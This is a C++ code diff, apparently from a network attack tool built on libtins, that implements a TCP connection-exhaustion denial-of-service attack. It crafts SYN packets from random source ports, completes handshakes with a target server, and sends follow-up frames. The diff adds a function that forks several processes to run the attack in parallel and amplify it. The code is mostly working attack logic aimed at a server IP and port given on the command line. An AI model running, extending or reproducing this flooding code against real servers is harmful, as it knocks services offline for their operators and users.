@@ -3,11 +3,12 @@
 //
 
 #include <iostream>
+#include <sys/wait.h>
 #include "common.h"
 #include "connection.h"
 #include "utils.h"
 
-void connection_exhausted_attack() {
+void connection_exhausted_attack_single_process() {
 
     // 起始时间
     auto start_time = std::chrono::steady_clock::now();
@@ -18,14 +19,14 @@ void connection_exhausted_attack() {
         auto current_time = std::chrono::steady_clock::now();
         auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time -start_time).count();
 
-        if(elapsed_time > globalArgs.commandArgs.attackDuration){
+        if(elapsed_time > globalArgs.commandArgs.attack_duration){
             printf("攻击结束\n");
             break;
         }
 
         // 创建攻击者随机端口
         int attacker_port = get_random_number();
-        Tins:: IP ip_packet = Tins::IP(globalArgs.commandArgs.serverIp) / Tins::TCP(globalArgs.commandArgs.serverPort, attacker_port);
+        Tins:: IP ip_packet = Tins::IP(globalArgs.commandArgs.server_ip) / Tins::TCP(globalArgs.commandArgs.server_port, attacker_port);
 
         // 创建 tcp 包
         auto & tcp = ip_packet.rfind_pdu<Tins::TCP>();
@@ -35,12 +36,10 @@ void connection_exhausted_attack() {
         std::unique_ptr<Tins::PDU> response(globalArgs.packetSender.send_recv(ip_packet));
         if(!response){
             std::cout << "no response" << std::endl;
-//            exit(-1);
         }
         auto& tcp_response = response->rfind_pdu<Tins::TCP>();
         if(!(tcp_response.get_flag(Tins::TCP::SYN) && (tcp_response.get_flag(Tins::TCP::ACK)))) {
             std::cout << "didn't get syn ack" << std::endl;
-//            exit(-1);
         }
         else {
             std::cout << "attacker server connection established" << std::endl;
@@ -59,5 +58,33 @@ void connection_exhausted_attack() {
         Tins::EthernetII ethPacket = Tins::EthernetII(serverMAC, localMac) / ip_packet;
         globalArgs.packetSender.send(ethPacket);
     }
+}
 
+void connection_exhausted_attack_multiple_processes() {
+    int process_count = globalArgs.commandArgs.attack_thread_count;
+    std::vector<pid_t> child_pids;
+
+    // 创建多个子进程
+    for(int i = 0; i < process_count; i++){
+        pid_t pid = fork();
+        if (pid == -1) {
+            std::cerr << "fork failed" << std::endl;
+            exit(-1);
+        } else if (pid == 0){ // 这里说明是父进程
+            // 子进程执行攻击函数
+            connection_exhausted_attack_single_process();
+            // 子进程完成之后退出
+            exit(0);
+        } else { // 这里说明是其他的子进程
+            child_pids.push_back(pid);
+        }
+    }
+
+    // 父进程等待所有的子进程完成之后退出
+    for(pid_t pid : child_pids){
+        int status;
+        waitpid(pid, &status, 0);
+    }
+
+    std::cout << "所有的攻击进程已经结束" << std::endl;
 }
